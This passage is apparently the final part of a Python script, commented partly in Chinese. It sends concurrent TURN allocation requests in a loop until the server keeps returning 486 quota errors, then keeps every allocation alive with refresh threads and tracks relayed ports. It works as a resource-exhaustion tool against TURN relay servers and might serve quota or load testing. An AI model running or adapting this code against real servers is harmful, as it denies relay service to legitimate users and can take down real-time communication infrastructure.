    keep_alive_executor = ThreadPoolExecutor(max_workers=args.concurrent * 2)
    
    start_time = time.time()
    allocation_counter = 0
    
    # 声明全局变量
    global should_continue_allocating
    
    try:
        # 持续allocate直到频繁遇到486错误
        with ThreadPoolExecutor(max_workers=args.concurrent) as executor:
            pending_futures = []
            
            while True:
                # 检查是否应该继续allocate
                with should_continue_lock:
                    if not should_continue_allocating:
                        print("[!] Failure threshold reached, stopping new allocation requests")
                        print("[!] Will continue refreshing existing allocations...")
                        break
                
                # 检查连续失败计数
                with stats_lock:
                    if stats['consecutive_failures'] >= args.failure_threshold:
                        with should_continue_lock:
                            should_continue_allocating = False
                        print(f"[!] Detected {stats['consecutive_failures']} consecutive failed allocations, reached threshold {args.failure_threshold}, stopping new allocations")
                        break
                
                # 提交新的allocation请求
                allocation_counter += 1
                future = executor.submit(
                    attempt_allocation,
                    server_address,
                    args.username,
                    args.password,
                    args.realm,
                    args.turn_server,
                    allocation_counter
                )
                pending_futures.append(future)
                
                # 处理已完成的请求
                completed_futures = [f for f in pending_futures if f.done()]
                for future in completed_futures:
                    pending_futures.remove(future)
                    try:
                        success, allocation_info, error_code = future.result()
                        
                        # 如果成功，启动keep-alive线程
                        if success and allocation_info:
                            keep_alive_executor.submit(
                                keep_allocation_alive,
                                allocation_info,
                                server_address,
                                args.username,
                                args.refresh_interval,
                                args.password
                            )
                        
                        # 检查是否达到连续失败阈值
                        with stats_lock:
                            if stats['consecutive_failures'] >= args.failure_threshold:
                                with should_continue_lock:
                                    should_continue_allocating = False
                    except Exception as e:
                        print(f"[!] Error processing allocation result: {e}")
                
                # 短暂延迟，避免请求过快
                time.sleep(0.01)
            
            # 等待所有pending请求完成
            print("[+] Waiting for all pending requests to complete...")
            for future in pending_futures:
                try:
                    success, allocation_info, error_code = future.result()
                    if success and allocation_info:
                        keep_alive_executor.submit(
                            keep_allocation_alive,
                            allocation_info,
                            server_address,
                            args.username,
                            args.refresh_interval,
                            args.password
                        )
                except Exception as e:
                    print(f"[!] Error processing pending allocation: {e}")
    
    except KeyboardInterrupt:
        print("\n[!] User interrupted")
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        stop_monitoring.set()
        print_stats()
        
        elapsed_time = time.time() - start_time
        print(f"\n[+] Allocation phase completed, elapsed time: {elapsed_time:.2f} seconds")
        print(f"[+] Successful Allocations: {stats['successful_allocations']}/{stats['total_requests']}")
        print(f"[+] Total 486 Errors: {stats['error_486_count']}")
        print(f"[+] Current Active Allocations: {stats['active_allocations']}")
        with relayed_ports_lock:
            print(f"[+] Unique Relayed Ports: {len(allocated_relayed_ports)}")
            print(f"[+] Duplicate Relayed Ports: {len(relayed_port_duplicates)}")
            if relayed_port_duplicates:
                print(f"[!] Found {len(relayed_port_duplicates)} duplicate relayed ports, this may indicate a problem")
        print(f"\n[+] Entering continuous refresh mode, allocations will be continuously refreshed...")
        print(f"[+] Press Ctrl+C to stop and clean up all allocations")
        
        try:
            while True:
                time.sleep(1)
                with stats_lock:
                    if stats['active_allocations'] == 0:
                        print("[!] All allocations have expired")
                        break
        except KeyboardInterrupt:
            print("\n[!] User interrupted, cleaning up all allocations...")
            # Set stop flag to notify all refresh threads to stop
            stop_all_refresh.set()
            
            # 清理所有allocation
            with allocations_lock:
                for allocation_info in active_allocations[:]:
                    try:
                        sock = allocation_info[0]
                        local_port = allocation_info[6] if len(allocation_info) > 6 else None
                        sock.close()
                        # 释放端口
                        if local_port is not None:
                            release_port(local_port)
                    except:
                        pass
                active_allocations.clear()
            print("[+] Cleanup completed")
        
        # 优雅关闭线程池
        try:
            stop_all_refresh.set()  # 确保停止标志已设置
            # 等待一小段时间让线程响应
            time.sleep(0.5)
            # 关闭线程池，不等待所有任务完成（因为可能还在等待refresh_interval）
            keep_alive_executor.shutdown(wait=False)
        except Exception as e:
            print(f"[!] Error closing thread pool: {e}")

if __name__ == "__main__":
    main()
